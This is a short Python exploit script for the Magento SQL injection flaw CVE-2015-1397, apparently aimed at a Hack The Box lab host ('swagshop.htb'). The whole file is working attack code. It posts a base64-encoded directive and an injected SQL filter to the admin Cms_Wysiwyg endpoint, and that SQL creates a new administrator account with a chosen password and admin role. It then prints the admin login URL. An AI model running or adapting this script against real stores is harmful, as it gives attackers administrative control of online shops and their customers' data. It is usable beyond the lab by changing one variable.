# Exploit for:      https://nvd.nist.gov/vuln/detail/CVE-2015-1397
# Based on:         https://www.exploit-db.com/exploits/37977
# All credits to:   Manish Kishan Tanwar AKA error1046
import requests
import base64

TARGET = "http://swagshop.htb/index.php"
USERNAME = "user"
PASSWORD = "pass"

target_url = f"{TARGET}/admin/Cms_Wysiwyg/directive/index/"
sql_injection=f"""
SET @SALT = 'rp';
SET @PASS = CONCAT(MD5(CONCAT( @SALT , '{PASSWORD}') ), CONCAT(':', @SALT ));
SELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL;
INSERT INTO `admin_user` (`firstname`, `lastname`,`email`,`username`,`password`,`created`,`lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,`rp_token_created_at`) VALUES ('Firstname','Lastname','email@example.com','{USERNAME}',@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW());
INSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name) VALUES (1,2,0,'U',(SELECT user_id FROM admin_user WHERE username = '{USERNAME}'),'Firstname');
"""
pfilter = f"popularity[from]=0&popularity[to]=3&popularity[field_expr]=0);{sql_injection.replace("\n", "")}"

print(f"[\u2714] Injecting admin credentials...")
response = requests.post(target_url,
                         data={"___directive": "e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ",
                        "filter": base64.b64encode(pfilter.encode()),
                        "forwarded": 1})
if response.ok:
    print(f"[\u2714] [\033[1;37m{USERNAME}\033[0m:\033[1;37m{PASSWORD}\033[0m] injected")
    print(f"[\u2714] Use [\033[1;37m{TARGET}/admin\033[0m] to login")
else:
    print(f"[\u2716] Failed due to:\n\n{response.text}")
